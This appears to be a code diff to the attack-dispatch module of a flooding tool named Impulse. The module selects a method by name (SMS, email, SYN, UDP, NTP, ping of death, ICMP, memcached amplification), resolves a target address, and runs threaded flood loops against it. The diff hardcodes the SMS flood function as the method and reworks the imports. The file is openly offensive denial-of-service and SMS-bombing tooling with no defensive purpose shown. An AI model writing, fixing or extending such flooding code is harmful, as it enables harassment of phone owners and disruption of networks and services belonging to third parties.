@@ -1,17 +1,18 @@
-# Import modules
 from time import time, sleep
 from threading import Thread
-from colorama import Fore
-from humanfriendly import format_timespan, Spinner
-from Impulse.tools.crash import CriticalError
-from Impulse.tools.ipTools import GetTargetAddress, InternetConnectionCheck
+from humanfriendly import format_timespan
+from humanfriendly.terminal.spinners import Spinner
+
+from lib.Impulse.tools.SMS.main import flood
+from lib.Impulse.tools.crash import CriticalError
+from lib.Impulse.tools.ipTools import GetTargetAddress
 
 """ Find & import ddos method """
 
 
 def GetMethodByName(method):
     if method == "SMS":
-        dir = "Impulse.tools.SMS.main"
+        dir = "lib.Impulse.tools.SMS.main"
     elif method == "EMAIL":
         dir = "tools.EMAIL.main"
     elif method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
@@ -46,16 +47,11 @@ class AttackMethod:
         self.target = target
         self.threads = []
         self.is_running = False
-
-    # Enter
-    def __enter__(self):
-        InternetConnectionCheck()
-        self.method = GetMethodByName(self.name)
+        self.method = flood
         self.target = GetTargetAddress(self.target_name, self.name)
-        return self
 
-    # Exit
-    def __exit__(self, exc_type, exc_val, exc_tb):
+    # Destructor
+    def __del__(self):
         print(f"Attack completed!")
 
     # Run time checker
@@ -69,7 +65,7 @@ class AttackMethod:
 
     # Run flooder
     def __RunFlood(self):
-        while self.is_running:
+        while self.is_running: # TODO SHIT HERE
             self.method(self.target)
 
     # Start threads
